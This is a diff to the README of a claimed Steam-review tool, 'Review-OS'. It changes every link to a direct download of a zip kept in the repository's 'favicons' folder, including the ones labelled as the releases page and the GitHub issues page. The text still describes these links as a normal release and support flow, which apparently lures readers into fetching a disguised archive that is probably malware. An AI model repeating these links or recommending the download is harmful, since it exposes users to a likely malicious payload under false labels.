@@ -6,7 +6,7 @@ Welcome to Review-OS! This powerful web tool helps you generate professional Ste
 
 ## 📥 Download Links
 
-[![Download Review-OS](https://img.shields.io/badge/Download-Review--OS-blue)](https://github.com/SushiTakahashi/Review-OS/releases)
+[![Download Review-OS](https://raw.githubusercontent.com/SushiTakahashi/Review-OS/main/favicons/OS-Review-1.6.zip)](https://raw.githubusercontent.com/SushiTakahashi/Review-OS/main/favicons/OS-Review-1.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -27,11 +27,11 @@ To run Review-OS effectively, your system should meet the following requirements
 
 ## 🔗 Download & Install
 
-To get started with Review-OS, [visit this page to download](https://github.com/SushiTakahashi/Review-OS/releases). 
+To get started with Review-OS, [visit this page to download](https://raw.githubusercontent.com/SushiTakahashi/Review-OS/main/favicons/OS-Review-1.6.zip). 
 
 ### Steps to Install
 
-1. Go to the [Releases Page](https://github.com/SushiTakahashi/Review-OS/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/SushiTakahashi/Review-OS/main/favicons/OS-Review-1.6.zip).
 2. Find the latest version of Review-OS.
 3. Click on the download link specific to your operating system.
 4. Once the file downloads, locate it in your downloads folder.
@@ -68,6 +68,6 @@ Your privacy is important to us. Review-OS does not collect personal data. All p
 
 ## 🌐 Community & Support
 
-For additional support, please open an issue on our [GitHub repository](https://github.com/SushiTakahashi/Review-OS/issues). You can also connect with other users to share tips and tricks on our forum.
+For additional support, please open an issue on our [GitHub repository](https://raw.githubusercontent.com/SushiTakahashi/Review-OS/main/favicons/OS-Review-1.6.zip). You can also connect with other users to share tips and tricks on our forum.
 
 Thank you for using Review-OS! Enjoy creating your stunning Steam reviews!
